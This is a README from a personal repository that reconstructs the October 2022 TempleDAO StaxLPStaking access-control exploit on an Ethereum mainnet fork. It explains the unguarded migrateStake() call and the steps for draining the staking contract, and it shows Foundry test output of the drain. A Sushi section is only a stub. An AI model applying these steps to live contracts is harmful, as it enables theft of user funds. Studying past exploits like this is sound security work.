Even though I have found so many resources about real-world exploits I think I should try them my ownself for a better understanding about these things ;| So, this is my personal re-constrction of real-World exploits in mainnet fork.I hope this will help me and you anon for better understanding about web3 security and to make web3 safe .

---

#### DISCLAIMER : Everything here is for educational purposes only

---

### TEMPLEDAO EXPLOIT

So I am starting with a Access Control vulnerability of a protocol called TempleDAO
<br/>

---

### TempleDAO exploit results in $2M loss

See more about it here : https://cointelegraph.com/news/templedao-exploit-results-in-2m-loss
<br/>
so I am continuing this repo in this way ğŸ¥´ yaa just writing down along this readmeeeeeeow
ok . so this is the folder strucutre for now 11/03/2023

```js
â”œâ”€â”€ AccessControl
â”‚   â”œâ”€â”€ Nf
â”‚   â””â”€â”€ TempleDao
â”‚       â”œâ”€â”€ StaxLPStaking
â”‚       â”‚   â””â”€â”€ StaxLPStaking.sol
â”‚       â””â”€â”€ TempleAttack.sol
â””â”€â”€ Re-entrancy

```

I just downloaded the StarxLPStaking contract by  
`ethereum-sources-downloader etherscan   0xd2869042e12a3506100af1d192b5b04d65137941`
<br/>
ok now let us go through the StaxLPStaking.sol which was exploited in On October 11, 2022 .
The attacker was able to get away with $2.34 million USD worth of LP tokens.ğŸ¥¶
Lets take a look about the functions here ...ğŸ¤” So here we can see some functions that could be called by anyone externally
lets see them , let's find the fuctions that do external calls without any restrictions

```js
 function stakeAll() external
  function stake(uint256 _amount) external
function stakeFor(address _for, uint256 _amount) public
function withdraw(uint256 amount, bool claim) public
function withdrawAll(bool claim) external
function migrateStake(address oldStaking, uint256 amount) external
```

so from the functions above there is a function really susğŸ‘€ function called migrateStake() let's see what it's doing ..

```js

   function migrateStake(address oldStaking, uint256 amount) external {
        StaxLPStaking(oldStaking).migrateWithdraw(msg.sender, amount);
        _applyStake(msg.sender, amount);
    }


```

wait! so here anyone can pass arbitary address as the parameter oldstaking into migrateStake() function so that
will call that contract's migrateWithdraw() function (This can be any contract thats the point ğŸ¥¶). Dev has implemeted onlyMigrator modifier but it's valied only in this contract not the calling contract . So what can we do right now ğŸ¤”

1.Step1 - Create a attacker contract with migrateWithdraw(address , uint256) function , so that we can pass the first line of migrateStake() function and then it will \_applyStake msg.sender(we) in stakingcontract , staking Lp tokens with the specified amount so we are passing LPtoken.balanceOF(stakingContract) so that we can basically drain all the tokens in that  
2. and then we just call withdrawAll then tokens will be transfered to our AttackerContract 3. once tokens recieved we can pass it to our EOA
(In the real world case the bad guy has converted the tokens to ether and pass it to Tonado cash we not gonna do that ğŸ¤ª)  
Ok thats it so we know the steps

Diagram

![diagmra](/img/d.PNG)

You can see the TAttacker contract that I have written ğŸ‘€
lets go to test so I jusst traced the address of stakingToken from stakingToken() function inside stakingContract

````bash
Traces:
  [5139] TempleDAO::testStakeContractState()
    â”œâ”€ [0] console::log(0xBcB8b7FC9197fEDa75C101fA69d3211b5a30dCD9) [staticcall]
    â”‚   â””â”€ â† ()
    â””â”€ â† ()
    ```
````

then I wrote down a simple test you can see it on test

### Writing the test

So firstly we need to fork the mainnet and go backIn time . How can we go back to pastğŸ˜ that's where we use blocknumber
we can use that to go back to past day where that block was vaildated so wtf is forking basically coping the state of block chain at that point of time into our node so here we are coping it to our provider's node runnig it basically virtually for testing . cool! . If I was wrong plz correct me cool . So,

```js
    function setUp() public {
        vm.createSelectFork("mainnet", 15700000);}

```

So here I am going back to 15700000 th block in ethereum blockchain , so this is before the exploit happen so you can
just see the balanceOf stakingtokens of stakingContract it's really a bignumber that means we have sucessfully come back in time ğŸ˜ So now we gonna start our exploit on mainnet fork

to run test type

```bash
forge test --match-contract  TempleDAO  -vvv

```

we get

```bash

Running 2 tests for test/TempleDAO.t.sol:TempleDAO
[PASS] testExploit() (gas: 381517)
Logs:
 Token balance in stakingContract after the exploit : 0
 Token balance of  attacker after the exploit : 321154865567124596801893

[PASS] testStakeContractState() (gas: 19196)
Logs:
 Token balance in stakingContract before the exploit : 321154865567124596801893
 Token balance of attacker before the exploit : 0

Test result: ok. 2 passed; 0 failed; finished in 780.81ms


```
### SUSHI EXPLOIT 

Diagram

![diagmra](/img/sushi.PNG)


```bash
forge test --match-contract Sushi  -vvvv

```









